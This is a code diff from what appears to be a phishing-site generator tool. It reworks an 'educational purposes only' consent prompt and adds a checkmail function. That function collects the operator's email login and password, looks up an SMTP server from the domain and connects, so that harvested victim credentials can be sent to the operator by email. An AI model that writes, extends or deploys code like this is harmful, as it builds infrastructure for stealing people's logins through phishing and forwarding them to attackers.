@@ -86,8 +86,28 @@ def loadModule(module):
  [*] %s module loaded. Building site...'''  % module))
 
 def checkEd():
-    print(red(" [!] Do you agree to use this tool for educational purposes only? (y/N) "))
-    if input(cyan('\n SF > ')).upper() != 'Y':
+
+    if input(red(' [!] Do you agree to use this tool for educational purposes only? [y/N] > ')).upper() != 'Y':
         clear()
         print(red('\n[ YOU ARE NOT AUTHORIZED TO USE THIS TOOL ]\n'))
         exit(0)
+
+def checkmail():
+
+    from core.email import smtp_provider, connect_smtp
+    from getpass import getpass
+    from smtplib import SMTP
+
+    if input(cyan('\n [!] Do you want to receive credentials by email? [y/N] > ')).upper() == 'Y':
+        
+        login = input(cyan(' [+] Enter your email > '))
+        passwd = getpass(cyan(' [+] Password > '))
+        try:
+            provider = login.split('@')[1].split('.')[0]
+        except IndexError:
+             print(red(' [!] This domain is not supported!'))
+             return
+        domain, port = smtp_provider(provider)
+
+        connect_smtp(domain, port, login, passwd)
+        
